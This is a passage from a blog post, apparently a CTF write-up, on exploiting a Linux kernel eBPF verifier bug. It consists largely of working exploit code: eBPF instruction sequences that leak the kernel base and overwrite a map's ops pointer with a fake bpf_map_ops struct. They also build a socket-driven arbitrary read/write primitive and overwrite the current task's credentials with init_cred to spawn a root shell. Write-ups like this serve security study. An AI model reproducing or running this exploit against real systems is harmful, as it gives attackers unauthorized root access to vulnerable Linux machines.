    <span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_9</span><span>,</span> <span>8</span><span>),</span>
    <span>BPF_EXIT_INSN</span><span>(),</span>
<span>};</span>

<span>run_bpf_prog</span><span>(</span><span>kleak_prog</span><span>,</span> <span>sizeof</span><span>(</span><span>kleak_prog</span><span>)</span><span>/</span><span>sizeof</span><span>(</span><span>kleak_prog</span><span>[</span><span>0</span><span>]));</span>

<span>uint64_t</span> <span>array_map_ops</span> <span>=</span> <span>bpf_map_lookup_elem</span><span>(</span><span>oob_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>);</span>
<span>uint64_t</span> <span>map_ptr</span> <span>=</span> <span>bpf_map_lookup_elem</span><span>(</span><span>oob_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>)</span> <span>-</span> <span>0xc0</span><span>;</span>
<span>uint64_t</span> <span>kbase</span> <span>=</span> <span>array_map_ops</span> <span>-</span> <span>ARRAY_MAP_OPS_OFFSET</span><span>;</span>

<span>printf</span><span>(</span><span>&#34;array_map_ops: %p</span><span>\n</span><span>kbase: %p</span><span>\n</span><span>map_ptr: %p</span><span>\n</span><span>&#34;</span><span>,</span> <span>array_map_ops</span><span>,</span> <span>kbase</span><span>,</span> <span>map_ptr</span><span>);</span>
</code></pre></div></div>

<h2 id="arbitrary-read--write">Arbitrary Read &amp; Write</h2>
<p>I found two methods for achieving this.</p>

<p>Manfred’s method is great for multiple kernels and allows doing multiple reads and writes with running new bpf programs, but needs two different programs for read and write.</p>

<p>I wanted to make a single program which allows multiple reads/writes from userspace.
Here I present you a method to so. This method is NOT like Manfred method which can be easily used for multiple kernels. This method is reliant on some offsets but it sums up my knowledge of eBPF for now.<br/></p>

<p>To understand this, we need to know about a few things. Lets start.</p>
<div><div><pre><code><span>static</span> <span>void</span> <span>*</span><span>array_of_map_lookup_elem</span><span>(</span><span>struct</span> <span>bpf_map</span> <span>*</span><span>map</span><span>,</span> <span>void</span> <span>*</span><span>key</span><span>)</span>
<span>{</span>
	<span>struct</span> <span>bpf_map</span> <span>**</span><span>inner_map</span> <span>=</span> <span>array_map_lookup_elem</span><span>(</span><span>map</span><span>,</span> <span>key</span><span>);</span>

	<span>if</span> <span>(</span><span>!</span><span>inner_map</span><span>)</span>
		<span>return</span> <span>NULL</span><span>;</span>

	<span>return</span> <span>READ_ONCE</span><span>(</span><span>*</span><span>inner_map</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<p>It dereferences the value returned by simple <code>array_map_lookup_elem</code> which returns a pointer to value.</p>

<h3 id="overwrite-ops">Overwrite Ops</h3>
<p>We will overwrite <code>ops</code> of <code>arb_read_write_map</code>. But first we need a fake <code>bpf_map_ops</code>, we will use <code>oob_map</code> for this. We will only write <code>map_update_elem</code>, <code>map_lookup_elem</code> and <code>map_gen_lookup</code>.</p>
<div><div><pre><code><span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_6</span><span>,</span> <span>BPF_REG_1</span><span>),</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_W</span><span>,</span> <span>BPF_REG_10</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>),</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>oob_map_fd</span><span>),</span>
<span>BPF_CALL_FUNC</span><span>(</span><span>BPF_FUNC_map_lookup_elem</span><span>),</span>

<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>

<span>// setup fake bpf_map_ops struct with only needed values</span>
<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span> <span>// move map_ptr + 0x110</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>kbase</span> <span>+</span> <span>ARRAY_MAP_UPDATE_ELEM_OFFSET</span><span>),</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>12</span> <span>*</span> <span>8</span><span>),</span>

<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>kbase</span> <span>+</span> <span>ARRAY_MAP_LOOKUP_ELEM_OFFSET</span><span>),</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>11</span> <span>*</span> <span>8</span><span>),</span>

<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>kbase</span> <span>+</span> <span>0x20e9c0</span><span>),</span> <span>// array_of_map_gen_lookup</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>19</span> <span>*</span> <span>8</span><span>),</span>
</code></pre></div></div>
<p>Now we will overwrite <code>ops</code> of <code>arb_read_write_map</code>. For this we use the <code>map_lookup_elem</code> like the previous program to make the <code>data_ptr</code> point to <code>map_ptr + 0x0</code> instead of <code>map_ptr + 0x110</code> and write <code>oob_map_ptr + 0x110</code> to <code>ops</code>.</p>
<div><div><pre><code><span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>),</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>arb_read_write_map_fd</span><span>),</span>
<span>BPF_CALL_FUNC</span><span>(</span><span>BPF_FUNC_map_lookup_elem</span><span>),</span> <span>// get values ptr</span>

<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>

<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span>

<span>// trigger vuln</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0x110</span><span>),</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>64</span><span>),</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_RSH</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>BPF_REG_1</span><span>),</span>
<span>BPF_ALU64_REG</span><span>(</span><span>BPF_SUB</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>),</span>

<span>// special instruction to load 64-bit immediates</span>
<span>BPF_LD_IMM64</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>map_ptr</span> <span>+</span> <span>0x110</span><span>),</span> <span>// oob_map_ptr + 0x110</span>

<span>// overwrite ops with oob_map_ptr + 0x110</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>

<span>BPF_EXIT_INSN</span><span>(),</span>
</code></pre></div></div>

<h3 id="arbitrary-read--write-program">Arbitrary Read &amp; Write program</h3>
<p>Now we will make a program which will use <code>map_lookup_elem</code> on <code>arb_read_write_map</code> to trigger <code>array_of_map_gen_lookup</code> during jitting.</p>
<div><div><pre><code><span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_6</span><span>,</span> <span>BPF_REG_1</span><span>),</span>
<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_W</span><span>,</span> <span>BPF_REG_10</span><span>,</span> <span>0</span><span>,</span> <span>-</span><span>4</span><span>),</span>

<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>),</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>arb_read_write_map_fd</span><span>),</span>
<span>BPF_CALL_FUNC</span><span>(</span><span>BPF_FUNC_map_lookup_elem</span><span>),</span> <span>// will use array_of_map_gen_lookup</span>

<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>

<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_8</span><span>,</span> <span>BPF_REG_0</span><span>),</span>
</code></pre></div></div>
<p>We will use a third map <code>info_map</code> for the communication part. We will tell the program to either do read or write using the socket. The read value will be written to <code>info_map</code> and the value to write will be taken from <code>info_map</code> also.</p>
<div><div><pre><code><span>BPF_LD_ABS</span><span>(</span><span>BPF_B</span><span>,</span> <span>0</span><span>),</span> <span>// loads a byte from the socket</span>
<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_9</span><span>,</span> <span>BPF_REG_0</span><span>),</span> <span>// decide byte for arb_read or arb_write</span>

<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>),</span>
<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>),</span>
<span>BPF_LD_MAP_FD</span><span>(</span><span>BPF_REG_1</span><span>,</span> <span>info_map_fd</span><span>),</span>
<span>BPF_CALL_FUNC</span><span>(</span><span>BPF_FUNC_map_lookup_elem</span><span>),</span>

<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>

<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JEQ</span><span>,</span> <span>BPF_REG_9</span><span>,</span> <span>1</span><span>,</span> <span>4</span><span>),</span> <span>// 0 for read, 1 for write</span>

<span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_8</span><span>,</span> <span>0</span><span>),</span> <span>// arb_read</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0</span><span>),</span>

<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>

<span>BPF_LDX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span> <span>// arb_write</span>
<span>BPF_STX_MEM</span><span>(</span><span>BPF_DW</span><span>,</span> <span>BPF_REG_8</span><span>,</span> <span>BPF_REG_7</span><span>,</span> <span>0</span><span>),</span>

<span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>),</span>
<span>BPF_EXIT_INSN</span><span>(),</span>
</code></pre></div></div>
<p>I wrote two functions for each:</p>
<div><div><pre><code><span>uint64_t</span> <span>arb_read</span><span>(</span><span>uint64_t</span> <span>addr</span><span>){</span>
    <span>int</span> <span>req</span> <span>=</span> <span>0</span><span>;</span>

    <span>bpf_map_update_elem</span><span>(</span><span>arb_read_write_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>&amp;</span><span>addr</span><span>,</span> <span>BPF_ANY</span><span>);</span>

    <span>write</span><span>(</span><span>socks</span><span>[</span><span>1</span><span>],</span> <span>&amp;</span><span>req</span><span>,</span> <span>sizeof</span><span>(</span><span>req</span><span>));</span>

    <span>return</span> <span>bpf_map_lookup_elem</span><span>(</span><span>info_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>);</span>
<span>}</span>

<span>int</span> <span>arb_write</span><span>(</span><span>uint64_t</span> <span>addr</span><span>,</span> <span>uint64_t</span> <span>val</span><span>){</span>
    <span>int</span> <span>req</span> <span>=</span> <span>1</span><span>;</span>

    <span>bpf_map_update_elem</span><span>(</span><span>arb_read_write_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>&amp;</span><span>addr</span><span>,</span> <span>BPF_ANY</span><span>);</span>
    <span>bpf_map_update_elem</span><span>(</span><span>info_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>&amp;</span><span>val</span><span>,</span> <span>BPF_ANY</span><span>);</span>

    <span>write</span><span>(</span><span>socks</span><span>[</span><span>1</span><span>],</span> <span>&amp;</span><span>req</span><span>,</span> <span>sizeof</span><span>(</span><span>req</span><span>));</span>

    <span>// check if the value is written or not</span>
    <span>// used for debugging</span>
    <span>return</span> <span>bpf_map_lookup_elem</span><span>(</span><span>info_map_fd</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>)</span> <span>==</span> <span>val</span><span>;</span>
<span>}</span>
</code></pre></div></div>
<p>And with that I achieved what I wanted. (sigh)</p>
<div><div><pre><code><span>uint64_t</span> <span>current_task_struct</span> <span>=</span> <span>arb_read</span><span>(</span><span>arb_read</span><span>(</span><span>__per_cpu_offset</span><span>)</span> <span>+</span> <span>current_task</span><span>);</span>
<span>uint64_t</span> <span>init_cred</span> <span>=</span> <span>kbase</span> <span>+</span> <span>INIT_CRED_OFFSET</span><span>;</span>

<span>arb_write</span><span>(</span><span>current_task_struct</span> <span>+</span> <span>CRED_OFFSET</span><span>,</span> <span>init_cred</span><span>);</span>

<span>system</span><span>(</span><span>&#34;/bin/sh&#34;</span><span>);</span>
</code></pre></div></div>

<p>If you want to exit gracefully, you need to repair the overwritten <code>ops</code> to original value.</p>

<p>My final exploit is available <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/kernel/d3bpf">here</a>.</p>

<p>Finally I want to thank Mafred Paul, R and <a href="https://twitter.com/chompie1337">@chompie1337</a> for the amazing content about the subject.</p>


<ul>
  <li><a href="https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story</a></li>
  <li><a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a></li>
  <li><a href="https://gist.github.com/d4em0n/b0320ce8a3a930ecca1aa9d014ba79ba">https://gist.github.com/d4em0n/b0320ce8a3a930ecca1aa9d014ba79ba</a></li>
</ul>

	  </div></div>
  </body>
</html>
